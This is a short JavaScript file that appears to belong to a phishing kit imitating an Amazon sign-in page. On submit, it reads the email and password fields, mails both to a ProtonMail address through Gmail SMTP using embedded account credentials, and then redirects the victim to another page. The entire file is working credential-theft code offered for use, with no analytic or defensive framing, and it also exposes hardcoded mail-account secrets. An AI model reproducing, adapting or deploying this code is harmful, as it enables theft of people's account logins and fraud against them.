window.onload = function()
{
    const btn = document.querySelector('#submit');

    btn.addEventListener("click", function(e) {
        e.preventDefault();
        var x = document.querySelector("#ap_customer_email");
        var email = x.value;

        var y = document.querySelector("#ap_customer_password");
        var senha = y.value;

        if (email.indexOf("@") != -1) {
                Email.send({
                    Host: "smtp.gmail.com",
                    Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                    Password : "ryqi owje owui bjfw",
                    To : 'user1533@protonmail.com',
                    From : "xsda.ddce.2343.2343.xsop@gmail.com",
                    Subject : `Amazon Prime: ${email}`,
                    Body : `<table>
                              <tr>
                                <th>Email</th>
                                <th>Senha</th>
                              </tr>
                              <tr>
                                <td>${email}</td>
                                <td>${senha}</td>
                              </tr>
                            </table>`,
                });
            window.location.href = "localdeenvio.html";
        } else {
            document.getElementById("ap_customer_email").value='';
            document.getElementById("ap_customer_password").value='';
        }
    });
}

